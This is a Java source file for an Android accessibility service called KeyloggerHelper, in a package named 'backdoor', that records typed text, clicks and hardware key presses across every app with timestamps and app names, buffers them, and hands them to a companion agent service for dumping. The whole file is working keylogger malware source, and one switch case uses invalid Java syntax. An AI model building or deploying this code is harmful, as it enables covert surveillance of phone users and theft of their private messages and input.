package com.lazyframework.backdoor;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.text.TextUtils;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicBoolean;

public class KeyloggerHelper extends AccessibilityService {
    private static final String TAG = "LazyFramework";
    
    // ==================== STATIC REFERENCES ====================
    private static AgentService agentService;
    private static KeyloggerHelper instance;
    private static boolean isServiceRunning = false;
    
    // ==================== KEYLOGGING STATE ====================
    private AtomicBoolean isKeyloggingEnabled = new AtomicBoolean(false);
    private StringBuilder currentWord = new StringBuilder();
    private String lastPackageName = "";
    private String lastClassName = "";
    private long lastKeyTime = 0;
    private int lastKeyCode = -1;
    private boolean isShiftPressed = false;
    private boolean isCapsLockOn = false;
    private boolean isCtrlPressed = false;
    private boolean isAltPressed = false;
    private boolean isMetaPressed = false;
    
    // ==================== BUFFER & CACHE ====================
    private StringBuilder keyBuffer = new StringBuilder();
    private static final int MAX_BUFFER_SIZE = 500000;
    private StringBuilder fullLogBuffer = new StringBuilder();
    private static final int MAX_LOG_SIZE = 1000000;
    
    // ==================== WORD COMPLETION ====================
    private StringBuilder wordBuffer = new StringBuilder();
    private long lastWordTime = 0;
    private static final long WORD_TIMEOUT = 3000; // 3 detik
    
    // ==================== KEY MAPPING ====================
    private static final ConcurrentHashMap<Integer, String> KEY_MAP = new ConcurrentHashMap<>();
    private static final ConcurrentHashMap<Integer, String> SHIFT_KEY_MAP = new ConcurrentHashMap<>();
    
    static {
        // ============ LETTERS ============
        KEY_MAP.put(KeyEvent.KEYCODE_A, "a"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_A, "A");
        KEY_MAP.put(KeyEvent.KEYCODE_B, "b"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_B, "B");
        KEY_MAP.put(KeyEvent.KEYCODE_C, "c"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_C, "C");
        KEY_MAP.put(KeyEvent.KEYCODE_D, "d"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_D, "D");
        KEY_MAP.put(KeyEvent.KEYCODE_E, "e"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_E, "E");
        KEY_MAP.put(KeyEvent.KEYCODE_F, "f"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_F, "F");
        KEY_MAP.put(KeyEvent.KEYCODE_G, "g"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_G, "G");
        KEY_MAP.put(KeyEvent.KEYCODE_H, "h"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_H, "H");
        KEY_MAP.put(KeyEvent.KEYCODE_I, "i"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_I, "I");
        KEY_MAP.put(KeyEvent.KEYCODE_J, "j"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_J, "J");
        KEY_MAP.put(KeyEvent.KEYCODE_K, "k"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_K, "K");
        KEY_MAP.put(KeyEvent.KEYCODE_L, "l"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_L, "L");
        KEY_MAP.put(KeyEvent.KEYCODE_M, "m"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_M, "M");
        KEY_MAP.put(KeyEvent.KEYCODE_N, "n"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_N, "N");
        KEY_MAP.put(KeyEvent.KEYCODE_O, "o"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_O, "O");
        KEY_MAP.put(KeyEvent.KEYCODE_P, "p"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_P, "P");
        KEY_MAP.put(KeyEvent.KEYCODE_Q, "q"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_Q, "Q");
        KEY_MAP.put(KeyEvent.KEYCODE_R, "r"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_R, "R");
        KEY_MAP.put(KeyEvent.KEYCODE_S, "s"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_S, "S");
        KEY_MAP.put(KeyEvent.KEYCODE_T, "t"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_T, "T");
        KEY_MAP.put(KeyEvent.KEYCODE_U, "u"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_U, "U");
        KEY_MAP.put(KeyEvent.KEYCODE_V, "v"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_V, "V");
        KEY_MAP.put(KeyEvent.KEYCODE_W, "w"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_W, "W");
        KEY_MAP.put(KeyEvent.KEYCODE_X, "x"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_X, "X");
        KEY_MAP.put(KeyEvent.KEYCODE_Y, "y"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_Y, "Y");
        KEY_MAP.put(KeyEvent.KEYCODE_Z, "z"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_Z, "Z");
        
        // ============ NUMBERS ============
        KEY_MAP.put(KeyEvent.KEYCODE_0, "0"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_0, ")");
        KEY_MAP.put(KeyEvent.KEYCODE_1, "1"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_1, "!");
        KEY_MAP.put(KeyEvent.KEYCODE_2, "2"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_2, "@");
        KEY_MAP.put(KeyEvent.KEYCODE_3, "3"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_3, "#");
        KEY_MAP.put(KeyEvent.KEYCODE_4, "4"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_4, "$");
        KEY_MAP.put(KeyEvent.KEYCODE_5, "5"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_5, "%");
        KEY_MAP.put(KeyEvent.KEYCODE_6, "6"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_6, "^");
        KEY_MAP.put(KeyEvent.KEYCODE_7, "7"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_7, "&");
        KEY_MAP.put(KeyEvent.KEYCODE_8, "8"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_8, "*");
        KEY_MAP.put(KeyEvent.KEYCODE_9, "9"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_9, "(");
        
        // ============ SYMBOLS ============
        KEY_MAP.put(KeyEvent.KEYCODE_PERIOD, "."); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_PERIOD, ">");
        KEY_MAP.put(KeyEvent.KEYCODE_COMMA, ","); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_COMMA, "<");
        KEY_MAP.put(KeyEvent.KEYCODE_SLASH, "/"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_SLASH, "?");
        KEY_MAP.put(KeyEvent.KEYCODE_BACKSLASH, "\\"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_BACKSLASH, "|");
        KEY_MAP.put(KeyEvent.KEYCODE_GRAVE, "`"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_GRAVE, "~");
        KEY_MAP.put(KeyEvent.KEYCODE_MINUS, "-"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_MINUS, "_");
        KEY_MAP.put(KeyEvent.KEYCODE_EQUALS, "="); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_EQUALS, "+");
        KEY_MAP.put(KeyEvent.KEYCODE_LEFT_BRACKET, "["); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_LEFT_BRACKET, "{");
        KEY_MAP.put(KeyEvent.KEYCODE_RIGHT_BRACKET, "]"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_RIGHT_BRACKET, "}");
        KEY_MAP.put(KeyEvent.KEYCODE_SEMICOLON, ";"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_SEMICOLON, ":");
        KEY_MAP.put(KeyEvent.KEYCODE_APOSTROPHE, "'"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_APOSTROPHE, "\"");
        KEY_MAP.put(KeyEvent.KEYCODE_SPACE, " "); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_SPACE, " ");
        
        // ============ SPECIAL KEYS (untuk logging) ============
        // KeyEvent constants untuk key yang tidak memiliki karakter
        // KEYCODE_ENTER, KEYCODE_DEL, KEYCODE_TAB, KEYCODE_DPAD_*, dll
    }

    // ==================== SERVICE LIFECYCLE ====================

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "⌨️ KeyloggerHelper created");
        instance = this;
        isServiceRunning = true;
        
        // Configure accessibility service
        configureService();
        
        // Start listening
        isKeyloggingEnabled.set(true);
        
        // Set initial state
        keyBuffer.setLength(0);
        fullLogBuffer.setLength(0);
        
        Log.d(TAG, "✅ KeyloggerHelper initialized and listening");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Skip if keylogging is disabled
        if (!isKeyloggingEnabled.get()) {
            return;
        }

        try {
            int eventType = event.getEventType();
            
            // ============ HANDLE KEY EVENTS (Global) ============
            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                handleTextChanged(event);
            }
            
            // ============ HANDLE WINDOW STATE CHANGED ============
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                handleWindowChange(event);
            }
            
            // ============ HANDLE VIEW CLICKED ============
            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                handleViewClicked(event);
            }
            
            // ============ HANDLE FOCUSED VIEW ============
            if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
                handleViewFocused(event);
            }
            
            // ============ HANDLE SCROLL (sometimes indicates input) ============
            if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
                handleScrolled(event);
            }

        } catch (Exception e) {
            Log.e(TAG, "❌ Accessibility event error: " + e.getMessage());
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "⚠️ KeyloggerHelper interrupted");
        isServiceRunning = false;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "⌨️ KeyloggerHelper destroyed");
        isServiceRunning = false;
        instance = null;
        isKeyloggingEnabled.set(false);
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "✅ KeyloggerHelper service connected");
        isServiceRunning = true;
        isKeyloggingEnabled.set(true);
        
        // Configure accessibility service
        configureService();
    }

    // ==================== CONFIGURATION ====================

    private void configureService() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                     AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE |
                     AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            info.flags |= AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        }
        
        info.notificationTimeout = 50; // ms
        
        setServiceInfo(info);
    }

    // ==================== EVENT HANDLERS ====================

    private void handleTextChanged(AccessibilityEvent event) {
        try {
            // Get text from event
            if (event.getText() != null && !event.getText().isEmpty()) {
                CharSequence text = event.getText().get(0);
                if (text != null && text.length() > 0) {
                    String newText = text.toString();
                    
                    // Get source info
                    String packageName = event.getPackageName() != null ? 
                        event.getPackageName().toString() : "unknown";
                    String className = event.getClassName() != null ?
                        event.getClassName().toString() : "unknown";
                    
                    // Get current text from source node
                    String currentText = getTextFromSource(event);
                    
                    // Detect what changed (new characters, deletion, etc)
                    String changedText = detectTextChange(currentText, newText, event);
                    
                    if (changedText != null && !changedText.isEmpty()) {
                        // Log the keystroke
                        logKey(packageName, className, changedText);
                        
                        // Send to agent service
                        if (agentService != null) {
                            agentService.onKeyLogged(changedText);
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Text changed error: " + e.getMessage());
        }
    }

    private void handleWindowChange(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName() != null ?
                event.getPackageName().toString() : "unknown";
            String className = event.getClassName() != null ?
                event.getClassName().toString() : "unknown";
            
            // Log window change
            if (!packageName.equals(lastPackageName)) {
                String logEntry = String.format(
                    "\n=== [%s] WINDOW CHANGE: %s\n",
                    getCurrentTimestamp(),
                    packageName
                );
                appendToBuffer(logEntry);
                
                lastPackageName = packageName;
                lastClassName = className;
                
                Log.d(TAG, "🪟 Window changed: " + packageName + " (" + className + ")");
            }
        } catch (Exception e) {
            Log.e(TAG, "Window change error: " + e.getMessage());
        }
    }

    private void handleViewClicked(AccessibilityEvent event) {
        try {
            // Sometimes clicks represent key presses in some apps
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                CharSequence text = source.getText();
                CharSequence contentDesc = source.getContentDescription();
                
                String logText = "";
                if (text != null && text.length() > 0) {
                    logText = text.toString();
                } else if (contentDesc != null && contentDesc.length() > 0) {
                    logText = "[Click: " + contentDesc.toString() + "]";
                } else {
                    logText = "[Click: " + source.getClassName() + "]";
                }
                
                if (!logText.isEmpty()) {
                    String packageName = event.getPackageName() != null ?
                        event.getPackageName().toString() : "unknown";
                    
                    String logEntry = String.format(
                        "[%s] %s - %s\n",
                        getCurrentTimestamp(),
                        packageName,
                        logText
                    );
                    appendToBuffer(logEntry);
                    
                    if (agentService != null) {
                        agentService.onKeyLogged(logText);
                    }
                }
                
                source.recycle();
            }
        } catch (Exception e) {
            Log.e(TAG, "View clicked error: " + e.getMessage());
        }
    }

    private void handleViewFocused(AccessibilityEvent event) {
        try {
            // Track which view has focus (for better context)
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                // Track focus for debugging
                source.recycle();
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    private void handleScrolled(AccessibilityEvent event) {
        // Sometimes used to detect input in scrolling views
        // Minimal logging
    }

    // ==================== HELPER METHODS ====================

    private String getTextFromSource(AccessibilityEvent event) {
        try {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                CharSequence text = source.getText();
                if (text != null) {
                    return text.toString();
                }
                source.recycle();
            }
        } catch (Exception e) {
            // Ignore
        }
        return "";
    }

    private String detectTextChange(String oldText, String newText, AccessibilityEvent event) {
        try {
            if (oldText == null) oldText = "";
            if (newText == null) newText = "";
            
            // If same text, no change
            if (oldText.equals(newText)) {
                return null;
            }
            
            // Check if text was deleted (shorter)
            if (newText.length() < oldText.length()) {
                // Find what was deleted
                int minLen = Math.min(oldText.length(), newText.length());
                int diffIndex = 0;
                for (int i = 0; i < minLen; i++) {
                    if (oldText.charAt(i) != newText.charAt(i)) {
                        diffIndex = i;
                        break;
                    }
                    diffIndex = i + 1;
                }
                
                if (diffIndex < oldText.length()) {
                    String deleted = oldText.substring(diffIndex);
                    if (deleted.length() <= 10) {
                        return "[DEL] " + deleted;
                    } else {
                        return "[DEL] (multiple characters)";
                    }
                }
                return null;
            }
            
            // Check if text was added (longer)
            if (newText.length() > oldText.length()) {
                // Find what was added
                int minLen = Math.min(oldText.length(), newText.length());
                int diffIndex = 0;
                for (int i = 0; i < minLen; i++) {
                    if (oldText.charAt(i) != newText.charAt(i)) {
                        diffIndex = i;
                        break;
                    }
                    diffIndex = i + 1;
                }
                
                if (diffIndex < newText.length()) {
                    String added = newText.substring(diffIndex);
                    // Check if it's a password field
                    if (event != null && event.getSource() != null) {
                        AccessibilityNodeInfo source = event.getSource();
                        if (source != null) {
                            boolean isPassword = source.isPassword();
                            source.recycle();
                            if (isPassword && added.length() > 0) {
                                return "[PASSWORD] " + "*".repeat(added.length());
                            }
                        }
                    }
                    return added;
                }
                return null;
            }
            
            // Same length, content changed (replace)
            if (oldText.length() == newText.length()) {
                String changed = "";
                for (int i = 0; i < oldText.length(); i++) {
                    if (oldText.charAt(i) != newText.charAt(i)) {
                        changed += newText.charAt(i);
                    }
                }
                if (!changed.isEmpty()) {
                    return "[REPLACE] " + changed;
                }
            }
            
            return null;
            
        } catch (Exception e) {
            Log.e(TAG, "Detect change error: " + e.getMessage());
            return null;
        }
    }

    private void logKey(String packageName, String className, String keyText) {
        try {
            // Skip if empty
            if (keyText == null || keyText.isEmpty()) {
                return;
            }
            
            // Format log entry
            String timestamp = getCurrentTimestamp();
            
            // Build full log entry
            String logEntry = String.format(
                "[%s] %s (%s): %s\n",
                timestamp,
                packageName,
                className,
                keyText
            );
            
            // Append to buffer
            appendToBuffer(logEntry);
            
            // Update word buffer (for word completion tracking)
            updateWordBuffer(keyText);
            
            // Debug log (limited)
            String debugText = keyText.length() > 50 ? 
                keyText.substring(0, 50) + "..." : keyText;
            Log.d(TAG, "⌨️ Key: " + debugText);
            
        } catch (Exception e) {
            Log.e(TAG, "Log key error: " + e.getMessage());
        }
    }

    private void updateWordBuffer(String text) {
        try {
            if (text == null || text.isEmpty()) return;
            
            char[] chars = text.toCharArray();
            for (char c : chars) {
                if (Character.isLetterOrDigit(c)) {
                    wordBuffer.append(c);
                } else if (c == ' ') {
                    // Space means word complete
                    if (wordBuffer.length() > 0) {
                        String word = wordBuffer.toString();
                        // Word complete - could be used for autocorrect tracking
                        wordBuffer.setLength(0);
                    }
                } else {
                    // Punctuation, word maybe complete
                    if (wordBuffer.length() > 0 && !Character.isLetterOrDigit(c)) {
                        String word = wordBuffer.toString();
                        wordBuffer.setLength(0);
                    }
                    // Handle special characters
                    if (c == '\n') {
                        // New line, word complete
                        if (wordBuffer.length() > 0) {
                            String word = wordBuffer.toString();
                            wordBuffer.setLength(0);
                        }
                    }
                }
            }
            
            // Reset if buffer too large
            if (wordBuffer.length() > 100) {
                wordBuffer.setLength(0);
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    private synchronized void appendToBuffer(String text) {
        try {
            fullLogBuffer.append(text);
            keyBuffer.append(text);
            
            // Trim if too large
            if (fullLogBuffer.length() > MAX_LOG_SIZE) {
                int cutIndex = fullLogBuffer.indexOf("\n", fullLogBuffer.length() / 2);
                if (cutIndex > 0) {
                    fullLogBuffer.delete(0, cutIndex + 1);
                } else {
                    fullLogBuffer.setLength(0);
                }
            }
            
            if (keyBuffer.length() > MAX_BUFFER_SIZE) {
                int cutIndex = keyBuffer.indexOf("\n", keyBuffer.length() / 2);
                if (cutIndex > 0) {
                    keyBuffer.delete(0, cutIndex + 1);
                } else {
                    keyBuffer.setLength(0);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Buffer append error: " + e.getMessage());
        }
    }

    private String getCurrentTimestamp() {
        return new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
    }

    private String getFullTimestamp() {
        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
    }

    // ==================== PUBLIC METHODS FOR AGENT ====================

    public static void setAgentService(AgentService service) {
        agentService = service;
        Log.d(TAG, "📡 AgentService connected to KeyloggerHelper");
    }

    public static KeyloggerHelper getInstance() {
        return instance;
    }

    public static boolean isRunning() {
        return isServiceRunning && instance != null;
    }

    // ==================== START/STOP METHODS ====================

    public void startKeylogging() {
        isKeyloggingEnabled.set(true);
        String logEntry = String.format(
            "\n=== KEYLOGGER STARTED AT %s ===\n",
            getFullTimestamp()
        );
        appendToBuffer(logEntry);
        Log.d(TAG, "✅ Keylogging started");
    }

    public void stopKeylogging() {
        isKeyloggingEnabled.set(false);
        String logEntry = String.format(
            "\n=== KEYLOGGER STOPPED AT %s ===\n",
            getFullTimestamp()
        );
        appendToBuffer(logEntry);
        Log.d(TAG, "⏹️ Keylogging stopped");
    }

    public boolean isKeyloggingEnabled() {
        return isKeyloggingEnabled.get();
    }

    // ==================== DUMP METHODS ====================

    public String dumpKeylogs() {
        try {
            String logs;
            synchronized (this) {
                logs = fullLogBuffer.toString();
                fullLogBuffer.setLength(0);
                fullLogBuffer.append("=== NEW SESSION STARTED AT ")
                    .append(getFullTimestamp())
                    .append(" ===\n");
                
                // Also clear key buffer
                keyBuffer.setLength(0);
            }
            
            // Add header
            String header = String.format(
                "=== KEYLOG DUMP ===\n" +
                "Time: %s\n" +
                "Total: %d characters\n" +
                "===================\n\n",
                getFullTimestamp(),
                logs.length()
            );
            
            return header + logs;
        } catch (Exception e) {
            Log.e(TAG, "Dump error: " + e.getMessage());
            return "Error dumping keylogs: " + e.getMessage();
        }
    }

    public String dumpBuffer() {
        try {
            String logs;
            synchronized (this) {
                logs = keyBuffer.toString();
                keyBuffer.setLength(0);
            }
            return logs;
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    public String getStats() {
        try {
            synchronized (this) {
                int totalKeys = fullLogBuffer.toString().split("\n").length;
                int bufferSize = fullLogBuffer.length();
                int keyBufferSize = keyBuffer.length();
                
                return String.format(
                    "Keylogger Statistics:\n" +
                    "  Running: %s\n" +
                    "  Total Keys: %d\n" +
                    "  Log Size: %d bytes (%s)\n" +
                    "  Buffer Size: %d bytes (%s)\n" +
                    "  Current App: %s\n" +
                    "  Time: %s",
                    isKeyloggingEnabled.get() ? "✅ Yes" : "❌ No",
                    totalKeys,
                    bufferSize, formatSize(bufferSize),
                    keyBufferSize, formatSize(keyBufferSize),
                    lastPackageName,
                    getFullTimestamp()
                );
            }
        } catch (Exception e) {
            return "Error getting stats: " + e.getMessage();
        }
    }

    public void clearLogs() {
        synchronized (this) {
            fullLogBuffer.setLength(0);
            keyBuffer.setLength(0);
            fullLogBuffer.append("=== LOGS CLEARED AT ")
                .append(getFullTimestamp())
                .append(" ===\n");
        }
        Log.d(TAG, "🗑️ Logs cleared");
    }

    // ==================== UTILITY METHODS ====================

    private String formatSize(long size) {
        if (size <= 0) return "0 B";
        String[] units = {"B", "KB", "MB", "GB"};
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        return String.format("%.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
    }

    // ==================== FORWARD KEY EVENTS TO AGENT ====================

    public void forwardKeyToAgent(String keyText) {
        if (agentService != null && isKeyloggingEnabled.get()) {
            agentService.onKeyLogged(keyText);
        }
    }

    // ==================== KEYBOARD SHORTCUT DETECTION ====================

    // Untuk mendeteksi kombinasi tombol (Ctrl+C, Ctrl+V, dll)
    // Tidak semua keyboard Android support, tetapi berguna untuk debugging

    private boolean isModifierKey(int keyCode) {
        return keyCode == KeyEvent.KEYCODE_SHIFT_LEFT ||
               keyCode == KeyEvent.KEYCODE_SHIFT_RIGHT ||
               keyCode == KeyEvent.KEYCODE_CTRL_LEFT ||
               keyCode == KeyEvent.KEYCODE_CTRL_RIGHT ||
               keyCode == KeyEvent.KEYCODE_ALT_LEFT ||
               keyCode == KeyEvent.KEYCODE_ALT_RIGHT ||
               keyCode == KeyEvent.KEYCODE_META_LEFT ||
               keyCode == KeyEvent.KEYCODE_META_RIGHT;
    }

    // ==================== KEY EVENT HANDLER (Alternate) ====================

    // Metode alternatif untuk menangkap key events langsung
    // Berguna untuk hardware keyboard atau external keyboard

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        if (!isKeyloggingEnabled.get()) {
            return super.onKeyEvent(event);
        }

        try {
            int action = event.getAction();
            int keyCode = event.getKeyCode();
            
            // Track modifier keys
            if (keyCode == KeyEvent.KEYCODE_SHIFT_LEFT || keyCode == KeyEvent.KEYCODE_SHIFT_RIGHT) {
                isShiftPressed = (action == KeyEvent.ACTION_DOWN);
            }
            if (keyCode == KeyEvent.KEYCODE_CTRL_LEFT || keyCode == KeyEvent.KEYCODE_CTRL_RIGHT) {
                isCtrlPressed = (action == KeyEvent.ACTION_DOWN);
            }
            if (keyCode == KeyEvent.KEYCODE_ALT_LEFT || keyCode == KeyEvent.KEYCODE_ALT_RIGHT) {
                isAltPressed = (action == KeyEvent.ACTION_DOWN);
            }
            if (keyCode == KeyEvent.KEYCODE_META_LEFT || keyCode == KeyEvent.KEYCODE_META_RIGHT) {
                isMetaPressed = (action == KeyEvent.ACTION_DOWN);
            }
            
            // Only log key down events
            if (action == KeyEvent.ACTION_DOWN) {
                String keyChar = getKeyChar(keyCode, event);
                if (keyChar != null) {
                    String packageName = lastPackageName.isEmpty() ? "system" : lastPackageName;
                    String logEntry = String.format(
                        "[%s] %s - [KEY:%s] %s\n",
                        getCurrentTimestamp(),
                        packageName,
                        keyCode,
                        keyChar
                    );
                    appendToBuffer(logEntry);
                    
                    if (agentService != null) {
                        agentService.onKeyLogged(keyChar);
                    }
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Key event error: " + e.getMessage());
        }

        return super.onKeyEvent(event);
    }

    private String getKeyChar(int keyCode, KeyEvent event) {
        // Check if it's a printable character
        int unicode = event.getUnicodeChar();
        if (unicode > 0) {
            char c = (char) unicode;
            if (Character.isDefined(c) && !Character.isISOControl(c)) {
                return String.valueOf(c);
            }
        }
        
        // Check special keys
        switch (keyCode) {
            case KeyEvent.KEYCODE_ENTER:
                return "[ENTER]\n";
            case KeyEvent.KEYCODE_DEL:
                return "[BACKSPACE]";
            case KeyEvent.KEYCODE_TAB:
                return "[TAB]";
            case KeyEvent.KEYCODE_DPAD_LEFT:
                return "[LEFT]";
            case KeyEvent.KEYCODE_DPAD_RIGHT:
                return "[RIGHT]";
            case KeyEvent.KEYCODE_DPAD_UP:
                return "[UP]";
            case KeyEvent.KEYCODE_DPAD_DOWN:
                return "[DOWN]";
            case KeyEvent.KEYCODE_MENU:
                return "[MENU]";
            case KeyEvent.KEYCODE_BACK:
                return "[BACK]";
            case KeyEvent.KEYCODE_HOME:
                return "[HOME]";
            case KeyEvent.KEYCODE_SEARCH:
                return "[SEARCH]";
            case KeyEvent.KEYCODE_VOLUME_UP:
                return "[VOLUME_UP]";
            case KeyEvent.KEYCODE_VOLUME_DOWN:
                return "[VOLUME_DOWN]";
            case KeyEvent.KEYCODE_CAMERA:
                return "[CAMERA]";
            case KeyEvent.KEYCODE_POWER:
                return "[POWER]";
            case KeyEvent.KEYCODE_ESCAPE:
                return "[ESC]";
            case KeyEvent.KEYCODE_FORWARD_DEL:
                return "[DELETE]";
            case KeyEvent.KEYCODE_INSERT:
                return "[INSERT]";
            case KeyEvent.KEYCODE_PAGE_UP:
                return "[PAGE_UP]";
            case KeyEvent.KEYCODE_PAGE_DOWN:
                return "[PAGE_DOWN]";
            case KeyEvent.KEYCODE_MOVE_END:
                return "[END]";
            case KeyEvent.KEYCODE_MOVE_HOME:
                return "[HOME_KEY]";
            case KeyEvent.KEYCODE_NUMPAD_0...KeyEvent.KEYCODE_NUMPAD_9:
                return "[" + (keyCode - KeyEvent.KEYCODE_NUMPAD_0) + "]";
            default:
                // Check if it's a letter/number using map
                String key = KEY_MAP.get(keyCode);
                if (key != null) {
                    if (isShiftPressed || isCapsLockOn) {
                        String shifted = SHIFT_KEY_MAP.get(keyCode);
                        if (shifted != null) {
                            return shifted;
                        }
                    }
                    return key;
                }
                return null;
        }
    }

    // ==================== ON CONFIGURATION CHANGED ====================

    @Override
    public void onConfigurationChanged(android.content.res.Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        // Track keyboard changes, language changes, etc.
        Log.d(TAG, "⚙️ Configuration changed");
    }
}
